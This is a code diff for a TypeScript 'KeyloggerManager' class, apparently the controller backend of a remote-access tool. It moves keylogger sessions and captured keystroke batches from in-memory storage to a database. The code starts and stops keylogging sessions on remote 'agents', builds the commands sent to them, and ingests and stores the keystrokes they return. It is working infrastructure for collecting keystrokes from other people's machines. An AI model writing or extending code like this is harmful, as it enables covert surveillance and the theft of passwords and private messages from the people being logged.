@@ -1,4 +1,7 @@
 import { randomUUID } from 'crypto';
+import { db } from '$lib/server/db';
+import { keyloggerSession, keyloggerBatch } from '$lib/server/db/schema';
+import { eq, desc, and } from 'drizzle-orm';
 import type {
 	KeyloggerCommandPayload,
 	KeyloggerEventEnvelope,
@@ -7,34 +10,11 @@ import type {
 	KeyloggerSessionResponse,
 	KeyloggerSessionState,
 	KeyloggerStartConfig,
-	KeyloggerTelemetryBatch,
 	KeyloggerTelemetryState
 } from '$lib/types/keylogger';
+import { logger } from '../logger';
 
 const MAX_BATCH_HISTORY = 25;
-
-function cloneKeystroke(event: KeyloggerKeystroke): KeyloggerKeystroke {
-	return structuredClone(event);
-}
-
-function cloneBatch(batch: KeyloggerTelemetryBatch): KeyloggerTelemetryBatch {
-	return {
-		batchId: batch.batchId,
-		capturedAt: batch.capturedAt,
-		totalEvents: batch.totalEvents,
-		events: batch.events.map(cloneKeystroke)
-	} satisfies KeyloggerTelemetryBatch;
-}
-
-interface KeyloggerSessionRecord {
-	state: KeyloggerSessionState;
-}
-
-interface KeyloggerTelemetryRecord {
-	batches: KeyloggerTelemetryBatch[];
-	totalEvents: number;
-	lastCapturedAt?: string;
-}
 
 function normalizeMode(mode?: KeyloggerMode | null): KeyloggerMode {
 	if (mode === 'offline') {
@@ -61,35 +41,100 @@ function normalizeConfig(config: KeyloggerStartConfig | undefined | null): Keylo
 }
 
 export class KeyloggerManager {
-	private sessions = new Map<string, KeyloggerSessionRecord>();
-	private telemetry = new Map<string, KeyloggerTelemetryRecord>();
+	async getState(agentId: string): Promise<KeyloggerSessionResponse> {
+		try {
+			const sessionRecord = db
+				.select()
+				.from(keyloggerSession)
+				.where(eq(keyloggerSession.agentId, agentId))
+				.orderBy(desc(keyloggerSession.updatedAt))
+				.get();
 
-	getState(agentId: string): KeyloggerSessionResponse {
-		const session = this.sessions.get(agentId);
-		const telemetry = this.telemetry.get(agentId);
-		return {
-			session: session ? structuredClone(session.state) : null,
-			telemetry: telemetry
-				? {
-						batches: telemetry.batches.map(cloneBatch),
-						totalEvents: telemetry.totalEvents,
-						lastCapturedAt: telemetry.lastCapturedAt
-					}
-				: { batches: [], totalEvents: 0 }
-		} satisfies KeyloggerSessionResponse;
+			const batches = db
+				.select()
+				.from(keyloggerBatch)
+				.where(eq(keyloggerBatch.agentId, agentId))
+				.orderBy(desc(keyloggerBatch.capturedAt))
+				.limit(MAX_BATCH_HISTORY)
+				.all();
+
+			const telemetry: KeyloggerTelemetryState = {
+				batches: batches.map((b) => ({
+					batchId: b.id,
+					capturedAt:
+						b.capturedAt instanceof Date
+							? b.capturedAt.toISOString()
+							: new Date(b.capturedAt).toISOString(),
+					totalEvents: b.totalEvents,
+					events: JSON.parse(b.events) as KeyloggerKeystroke[]
+				})),
+				totalEvents: sessionRecord?.totalEvents ?? 0,
+				lastCapturedAt: sessionRecord?.lastCapturedAt
+					? sessionRecord.lastCapturedAt instanceof Date
+						? sessionRecord.lastCapturedAt.toISOString()
+						: new Date(sessionRecord.lastCapturedAt).toISOString()
+					: undefined
+			};
+
+			return {
+				session: sessionRecord
+					? {
+							sessionId: sessionRecord.id,
+							agentId: sessionRecord.agentId,
+							mode: sessionRecord.mode as KeyloggerMode,
+							startedAt:
+								sessionRecord.startedAt instanceof Date
+									? sessionRecord.startedAt.toISOString()
+									: new Date(sessionRecord.startedAt).toISOString(),
+							active: Boolean(sessionRecord.active),
+							config: JSON.parse(sessionRecord.config) as KeyloggerStartConfig,
+							totalEvents: sessionRecord.totalEvents,
+							lastCapturedAt: sessionRecord.lastCapturedAt
+								? sessionRecord.lastCapturedAt instanceof Date
+									? sessionRecord.lastCapturedAt.toISOString()
+									: new Date(sessionRecord.lastCapturedAt).toISOString()
+								: undefined
+						}
+					: null,
+				telemetry
+			} satisfies KeyloggerSessionResponse;
+		} catch (err) {
+			logger.error('Failed to get keylogger state', { agentId }, err);
+			return { session: null, telemetry: { batches: [], totalEvents: 0 } };
+		}
 	}
 
-	createSession(
+	async createSession(
 		agentId: string,
 		config: KeyloggerStartConfig,
 		sessionId?: string
-	): KeyloggerSessionState {
+	): Promise<KeyloggerSessionState> {
 		const normalized = normalizeConfig(config);
 		const identifier = sessionId?.trim() || randomUUID();
 		const now = new Date();
 
-		const record: KeyloggerSessionRecord = {
-			state: {
+		try {
+			// Deactivate any existing sessions for this agent
+			db.update(keyloggerSession)
+				.set({ active: 0, updatedAt: now })
+				.where(and(eq(keyloggerSession.agentId, agentId), eq(keyloggerSession.active, 1)))
+				.run();
+
+			db.insert(keyloggerSession)
+				.values({
+					id: identifier,
+					agentId,
+					mode: normalized.mode,
+					startedAt: now,
+					active: 1,
+					config: JSON.stringify(normalized),
+					totalEvents: 0,
+					createdAt: now,
+					updatedAt: now
+				})
+				.run();
+
+			return {
 				sessionId: identifier,
 				agentId,
 				mode: normalized.mode,
@@ -98,65 +143,156 @@ export class KeyloggerManager {
 				config: normalized,
 				totalEvents: 0,
 				lastCapturedAt: undefined
+			};
+		} catch (err) {
+			logger.error('Failed to create keylogger session', { agentId, identifier }, err);
+			throw err;
+		}
+	}
+
+	async updateConfig(
+		agentId: string,
+		config: KeyloggerStartConfig
+	): Promise<KeyloggerSessionState | null> {
+		const normalized = normalizeConfig(config);
+		const now = new Date();
+
+		try {
+			const sessionRecord = db
+				.select()
+				.from(keyloggerSession)
+				.where(and(eq(keyloggerSession.agentId, agentId), eq(keyloggerSession.active, 1)))
+				.get();
+
+			if (!sessionRecord) {
+				return null;
 			}
-		};
-		this.sessions.set(agentId, record);
-		this.ensureTelemetry(agentId);
-		return structuredClone(record.state);
-	}
 
-	updateConfig(agentId: string, config: KeyloggerStartConfig): KeyloggerSessionState | null {
-		const session = this.sessions.get(agentId);
-		if (!session) {
+			db.update(keyloggerSession)
+				.set({ config: JSON.stringify(normalized), updatedAt: now })
+				.where(eq(keyloggerSession.id, sessionRecord.id))
+				.run();
+
+			return {
+				sessionId: sessionRecord.id,
+				agentId: sessionRecord.agentId,
+				mode: sessionRecord.mode as KeyloggerMode,
+				startedAt:
+					sessionRecord.startedAt instanceof Date
+						? sessionRecord.startedAt.toISOString()
+						: new Date(sessionRecord.startedAt).toISOString(),
+				active: true,
+				config: normalized,
+				totalEvents: sessionRecord.totalEvents,
+				lastCapturedAt: sessionRecord.lastCapturedAt
+					? sessionRecord.lastCapturedAt instanceof Date
+						? sessionRecord.lastCapturedAt.toISOString()
+						: new Date(sessionRecord.lastCapturedAt).toISOString()
+					: undefined
+			};
+		} catch (err) {
+			logger.error('Failed to update keylogger config', { agentId }, err);
 			return null;
 		}
-		session.state.config = normalizeConfig(config);
-		return structuredClone(session.state);
 	}
 
-	stopSession(agentId: string, sessionId?: string): KeyloggerSessionState | null {
-		const session = this.sessions.get(agentId);
-		if (!session) {
+	async stopSession(agentId: string, sessionId?: string): Promise<KeyloggerSessionState | null> {
+		const now = new Date();
+		try {
+			const where = sessionId
+				? eq(keyloggerSession.id, sessionId)
+				: and(eq(keyloggerSession.agentId, agentId), eq(keyloggerSession.active, 1));
+
+			const sessionRecord = db.select().from(keyloggerSession).where(where).get();
+
+			if (!sessionRecord) {
+				return null;
+			}
+
+			db.update(keyloggerSession)
+				.set({ active: 0, updatedAt: now })
+				.where(eq(keyloggerSession.id, sessionRecord.id))
+				.run();
+
+			return {
+				sessionId: sessionRecord.id,
+				agentId: sessionRecord.agentId,
+				mode: sessionRecord.mode as KeyloggerMode,
+				startedAt:
+					sessionRecord.startedAt instanceof Date
+						? sessionRecord.startedAt.toISOString()
+						: new Date(sessionRecord.startedAt).toISOString(),
+				active: false,
+				config: JSON.parse(sessionRecord.config) as KeyloggerStartConfig,
+				totalEvents: sessionRecord.totalEvents,
+				lastCapturedAt: sessionRecord.lastCapturedAt
+					? sessionRecord.lastCapturedAt instanceof Date
+						? sessionRecord.lastCapturedAt.toISOString()
+						: new Date(sessionRecord.lastCapturedAt).toISOString()
+					: undefined
+			};
+		} catch (err) {
+			logger.error('Failed to stop keylogger session', { agentId, sessionId }, err);
 			return null;
 		}
-		if (sessionId && session.state.sessionId !== sessionId) {
-			return null;
-		}
-		session.state.active = false;
-		return structuredClone(session.state);
 	}
 
-	ingest(agentId: string, envelope: KeyloggerEventEnvelope): KeyloggerTelemetryState {
+	async ingest(
+		agentId: string,
+		envelope: KeyloggerEventEnvelope
+	): Promise<KeyloggerTelemetryState> {
 		if (!envelope || !Array.isArray(envelope.events)) {
 			throw new Error('Invalid keylogger payload');
 		}
 
-		const session = this.sessions.get(agentId);
-		if (session) {
-			session.state.totalEvents =
-				envelope.totalEvents ?? session.state.totalEvents + envelope.events.length;
-			session.state.lastCapturedAt = envelope.capturedAt;
-			session.state.mode = envelope.mode;
+		const now = new Date();
+		const capturedAt = new Date(envelope.capturedAt);
+
+		try {
+			db.transaction((tx) => {
+				const sessionRecord = tx
+					.select()
+					.from(keyloggerSession)
+					.where(eq(keyloggerSession.id, envelope.sessionId))
+					.get();
+
+				const totalEvents =
+					envelope.totalEvents ?? (sessionRecord?.totalEvents ?? 0) + envelope.events.length;
+
+				if (sessionRecord) {
+					tx.update(keyloggerSession)
+						.set({
+							totalEvents,
+							lastCapturedAt: capturedAt,
+							updatedAt: now
+						})
+						.where(eq(keyloggerSession.id, sessionRecord.id))
+						.run();
+				}
+
+				tx.insert(keyloggerBatch)
+					.values({
+						id: envelope.batchId || randomUUID(),
+						sessionId: envelope.sessionId,
+						agentId,
+						capturedAt,
+						events: JSON.stringify(envelope.events),
+						totalEvents,
+						createdAt: now
+					})
+					.run();
+			});
+
+			const state = await this.getState(agentId);
+			return state.telemetry;
+		} catch (err) {
+			logger.error(
+				'Failed to ingest keylogger events',
+				{ agentId, sessionId: envelope.sessionId },
+				err
+			);
+			throw err;
 		}
-
-		const telemetry = this.ensureTelemetry(agentId);
-		const batchId = envelope.batchId || randomUUID();
-		const batch: KeyloggerTelemetryBatch = {
-			batchId,
-			capturedAt: envelope.capturedAt,
-			totalEvents: envelope.totalEvents ?? telemetry.totalEvents + envelope.events.length,
-			events: envelope.events.map(cloneKeystroke)
-		};
-
-		telemetry.totalEvents = batch.totalEvents;
-		telemetry.lastCapturedAt = envelope.capturedAt;
-		telemetry.batches = [batch, ...telemetry.batches].slice(0, MAX_BATCH_HISTORY);
-
-		return {
-			batches: telemetry.batches.map(cloneBatch),
-			totalEvents: telemetry.totalEvents,
-			lastCapturedAt: telemetry.lastCapturedAt
-		} satisfies KeyloggerTelemetryState;
 	}
 
 	buildCommand(
@@ -169,15 +305,6 @@ export class KeyloggerManager {
 			mode: session.mode,
 			config: session.config
 		} satisfies KeyloggerCommandPayload;
-	}
-
-	private ensureTelemetry(agentId: string): KeyloggerTelemetryRecord {
-		let telemetry = this.telemetry.get(agentId);
-		if (!telemetry) {
-			telemetry = { batches: [], totalEvents: 0 };
-			this.telemetry.set(agentId, telemetry);
-		}
-		return telemetry;
 	}
 }
 
